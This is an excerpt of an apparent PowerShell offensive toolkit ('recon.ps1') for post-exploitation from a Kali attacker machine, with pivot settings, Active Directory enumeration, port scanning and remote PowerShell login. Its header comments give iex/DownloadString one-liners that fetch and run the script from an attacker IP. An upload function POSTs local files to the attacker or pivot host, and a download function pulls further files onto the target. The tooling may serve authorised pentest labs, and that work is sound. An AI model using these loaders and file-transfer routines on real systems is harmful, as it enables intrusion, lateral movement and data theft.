...
#
# With pivot (manual):
#   $PIVOT_IP="10.10.10.5"; $PIVOT_PORT=5555; iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/recon.ps1'))
#
# Auto-detect from {IP_KALI} placeholder:
#   iex ((New-Object System.Net.WebClient).DownloadString('http://{IP_KALI}/recon.ps1'))
#
...
function recon.help
 { 
    Banner
    Write-Host ''
    Write-Host '[*] Connection Management:'
    Write-Host '    - set.target IP [PORT]            : Set target IP/Port for pivot scenarios'
    Write-Host '    - show.target                     : Show current connection settings'
    Write-Host ''
    ...
    Write-Host '    - ad.user USERNAME                : Information about a user'
    Write-Host '    - ad.listusers                    : List common names for bruteforce'
    Write-Host '    - ad.groups                       : Domain groups privilege'
    Write-Host '    - ad.group GROUPNAME              : Information about a group'
...
#------------------------------------------
#  * Set target IP and Port (for pivoting) *
#------------------------------------------
function set.target {
    param (
        [string]$IP,
    ...
    if (-not $IP) {
        Write-Host ""
        Write-Host " [>] Set target connection (useful for pivoting):"
        Write-Host "        set.target IP_ADDRESS [PORT]"
        Write-Host ""
        Write-Host " Examples:"
        Write-Host "        set.target 10.10.10.5           # Uses port 80"
        Write-Host "        set.target 10.10.10.5 5555      # Custom port"
        Write-Host "        set.target 192.168.45.175       # Direct Kali"
        return
    }
    
    $global:PIVOT_IP = $IP
    $global:PIVOT_PORT = $Port
    
    Write-Host ""
    Write-Host " [OK] Target configured:" -ForegroundColor Green
    Write-Host "     IP:   $global:PIVOT_IP"
    Write-Host "     Port: $global:PIVOT_PORT"
    Write-Host ""
}
...
function show.target {
    ...
    Write-Host "     Default IP:   $IP_KALI"
    
    if ($global:PIVOT_IP) {
        Write-Host "     Pivot IP:     $global:PIVOT_IP" -ForegroundColor Yellow
        Write-Host "     Pivot Port:   $global:PIVOT_PORT" -ForegroundColor Yellow
        Write-Host ""
        Write-Host " [!] Using PIVOT configuration" -ForegroundColor Yellow
    } else {
        Write-Host " [!] Using DIRECT connection (no pivot set)" -ForegroundColor Green
    }
    Write-Host ""
}
...
#------------------------------------------
#  * Get effective target URL *
#------------------------------------------
function Get-TargetURL {
    if ($global:PIVOT_IP) {
        return "http://$($global:PIVOT_IP):$($global:PIVOT_PORT)"
    } else {
        return "http://$IP_KALI"
    }
}
...
function aux.upload {
    ...
    if (-not $file) {
        ...
        Write-Host "        aux.upload FILENAME"
        return
    }
    ...
    Write-Host " [->] Uploading to $targetURL..." -ForegroundColor Cyan
    
    try {
        Invoke-WebRequest $targetURL -Method Post -InFile $file -Headers @{ 'Content-Disposition' = "attachment; filename=$filename" } -UseBasicParsing
...
function aux.download {
    ...
    if (-not $file) {
        ...
        Write-Host "        aux.download FILENAME"
        return
    }
    
    $targetURL = Get-TargetURL
    Write-Host " [->] Downloading from $targetURL/$file..." -ForegroundColor Cyan
    
    try {
        Invoke-WebRequest "$targetURL/$file" -OutFile $file -UseBasicParsing
        Write-Host " [OK] Download successful: $file" -ForegroundColor Green
    } catch {
...
function recon.portscan(){
    ...
    if (-not $ip) {
        ...
        Write-Host "        recon.portscan HOSTNAME [1-1024]"
        return
    }
...
function ad.psremote {
    ...
    if (-not ($Username -and $Password -and $Hostname)) {
        ...
        Write-Host "        ad.psremote DOMAIN\USER PASSWORD HOSTNAME"
        return
    }
...
if ($IP_KALI -match '\{IP_KALI\}') {
    Write-Host ""
    Write-Host " [!] IP not auto-configured from server" -ForegroundColor Yellow
    Write-Host ""
    Write-Host " To configure connection, use one of these commands:" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "   For direct connection:"
    Write-Host '     $IP_KALI = "192.168.45.175"'
    Write-Host ""
    Write-Host "   For pivot connection:"
    Write-Host '     set.target 10.10.10.5 5555'
    Write-Host ""
} else {
    Write-Host ""
    Write-Host " [OK] Auto-configured connection to: $IP_KALI" -ForegroundColor Green
    Write-Host ""
}
